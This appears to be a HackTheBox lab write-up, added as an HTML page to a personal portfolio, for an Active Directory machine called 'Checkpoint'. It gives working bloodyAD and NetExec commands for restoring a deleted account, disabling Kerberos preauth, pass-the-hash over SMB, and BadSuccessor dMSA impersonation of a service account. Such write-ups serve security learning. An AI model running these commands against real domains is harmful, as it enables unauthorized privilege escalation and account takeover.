@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkpoint — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>Checkpoint</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-windows">Windows</span>
+    <span class="diff-tag diff-easy">Easy</span>
+    <span class="wu-date">Pwned: 2026-06-13</span>
+  </div>
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>Checkpoint</td></tr>
+  <tr><td>OS</td><td>Windows (Active Directory)</td></tr>
+  <tr><td>Difficulty</td><td>Easy</td></tr>
+  <tr><td>Status</td><td>User</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Tools Used</h2>
+  <div class="table-wrap"><table><thead><tr><th>Tool</th><th>Purpose</th></tr></thead><tbody>
+  <tr><td>nmap</td><td>Port &amp; service enumeration</td></tr>
+  <tr><td>bloodyAD</td><td>Enumerating writable objects, restoring a deleted object, UAC edits, BadSuccessor</td></tr>
+  <tr><td>NetExec (nxc)</td><td>SMB / LDAP authentication and share enumeration</td></tr>
+  <tr><td>openssl / iconv</td><td>Computing the NT (MD4) hash from a known password</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Summary</h2>
+  <p>Checkpoint is an Easy Windows Active Directory machine. Starting from the provided low-privilege account <code>alex.turner</code>, enumerating writable objects with bloodyAD shows <code>WRITE</code> over a tombstoned (deleted) object, <strong>Mark Davies</strong>. The object is restored, re-enabled, and configured for AS-REP by toggling <code>userAccountControl</code> flags; the account's NT hash is then derived from its known password and used to authenticate over SMB, exposing <code>DevDrop</code> and <code>VMBackups</code> shares. Finally, alex's <code>CREATE_CHILD</code> right over an OU is abused with the <strong>BadSuccessor</strong> technique: a delegated Managed Service Account (dMSA) is created that impersonates the <code>svc_deploy</code> service account via <code>msDS-ManagedAccountPrecededByLink</code>.</p>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <p>The scan shows a classic Active Directory domain controller, <code>DC01.checkpoint.htb</code>, with Kerberos, LDAP, SMB and WinRM exposed.</p>
+  <pre><code># Nmap 7.98 scan initiated as: nmap -sC -A -oN scan.txt 10.129.137.167
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ldapssl?
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+Service Info: Host: DC01; OS: Windows</code></pre>
+  <p>We start with the provided domain credentials:</p>
+  <div class="table-wrap"><table><thead><tr><th>Username</th><th>Password</th><th>Service</th></tr></thead><tbody>
+  <tr><td>alex.turner</td><td>Checkpoint2024!</td><td>Domain account (provided)</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <h3>CVEs / Vulnerabilities Identified</h3>
+  <div class="table-wrap"><table><thead><tr><th>Vulnerability</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>WRITE over a deleted object</td><td>alex.turner can restore and take control of the tombstoned Mark Davies account via bloodyAD.</td><td>High</td></tr>
+  <tr><td>BadSuccessor (dMSA abuse)</td><td>CREATE_CHILD over an OU allows creating a delegated MSA whose msDS-ManagedAccountPrecededByLink impersonates a privileged service account (svc_deploy).</td><td>High</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Initial Access / Lateral Movement</h2>
+  <h4>Enumerating Writable Objects</h4>
+  <p>bloodyAD's <code>get writable</code> lists the objects alex.turner can modify. Notably, he has <code>WRITE</code> over a deleted object, <strong>Mark Davies</strong>, and <code>CREATE_CHILD</code> over the Employees OU — both of which become the attack path.</p>
+  <pre><code>bloodyAD --host 10.129.160.74 -d checkpoint.htb \
+  -u alex.turner -p 'Checkpoint2024!' get writable
+
+distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb      DACL: WRITE
+distinguishedName: OU=Employees,DC=checkpoint,DC=htb            permission: CREATE_CHILD
+distinguishedName: CN=Mark Davies\0ADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb   permission: WRITE</code></pre>
+  <h4>Restoring &amp; Re-enabling Mark Davies</h4>
+  <p>The tombstoned Mark Davies object is restored into the Employees OU, then its <code>userAccountControl</code> is cleaned up — clearing <code>ACCOUNTDISABLE</code> and <code>PASSWORD_EXPIRED</code> and adding <code>DONT_REQ_PREAUTH</code> (AS-REP roastable):</p>
+  <pre><code># restore the deleted object under Employees
+bloodyAD --host 10.129.243.28 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
+  set restore 'CN=Mark Davies\0ADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb' \
+  --newParent 'OU=Employees,DC=checkpoint,DC=htb'
+
+# re-enable the account and relax password/preauth flags
+bloodyAD ... remove uac 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' -f ACCOUNTDISABLE
+bloodyAD ... remove uac 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' -f PASSWORD_EXPIRED
+bloodyAD ... add    uac 'CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb' -f DONT_REQ_PREAUTH</code></pre>
+  <h4>Authenticating as Mark Davies</h4>
+  <p>With a known password for the restored account, the NT (MD4) hash is computed locally and used for pass-the-hash authentication over SMB, which enumerates the available shares — including a writable <code>DevDrop</code> share and <code>VMBackups</code>:</p>
+  <pre><code>echo -n 'Checkpoint2024!' | iconv -t utf16le | openssl dgst -md4
+# MD4(stdin)= 0b28e49d9deb96f99d74578e214faec2
+
+nxc smb 10.129.104.32 -d checkpoint.htb -u mark.davies -H 0b28e49d9deb96f99d74578e214faec2 --shares
+# [+] checkpoint.htb\mark.davies:0b28e49d...
+# DevDrop    READ,WRITE   VS Code extensions share for approved .vsix packages
+# VMBackups  ...</code></pre>
+  <hr>
+  <h2>Privilege Escalation (BadSuccessor)</h2>
+  <p>alex.turner's <code>CREATE_CHILD</code> right over the Employees OU enables the <strong>BadSuccessor</strong> attack. A delegated Managed Service Account (dMSA) is created and linked to the privileged <code>svc_deploy</code> service account via <code>msDS-ManagedAccountPrecededByLink</code>, so that authenticating as the dMSA yields svc_deploy's privileges:</p>
+  <pre><code>bloodyAD --host 10.129.104.32 --dns 10.129.104.32 -d checkpoint.htb \
+  -u alex.turner -p 'Checkpoint2024!' \
+  add badSuccessor 'svc_deploy_dmsa' \
+  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
+  --ou 'OU=Employees,DC=checkpoint,DC=htb' --prepatch
+
+[+] Creating DMSA svc_deploy_dmsa$ in OU=Employees,DC=checkpoint,DC=htb
+[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb</code></pre>
+  <p>The link is confirmed via LDAP:</p>
+  <pre><code>nxc ldap 10.129.104.32 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
+  --query '(sAMAccountName=svc_deploy_dmsa$)' 'distinguishedName msDS-ManagedAccountPrecededByLink'
+
+distinguishedName    CN=svc_deploy_dmsa,OU=Employees,DC=checkpoint,DC=htb
+msDS-ManagedAccountPrecededByLink CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb</code></pre>
+  <hr>
+  <h2>Notes</h2>
+  <p>This writeup documents the chain from <code>alex.turner</code> through restoring Mark Davies to the BadSuccessor dMSA impersonation of <code>svc_deploy</code>. Flag values are omitted.</p>
+  <hr>
+  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+<script type="module" src="../js/modules/writeup.js"></script>
+</body>
+</html>
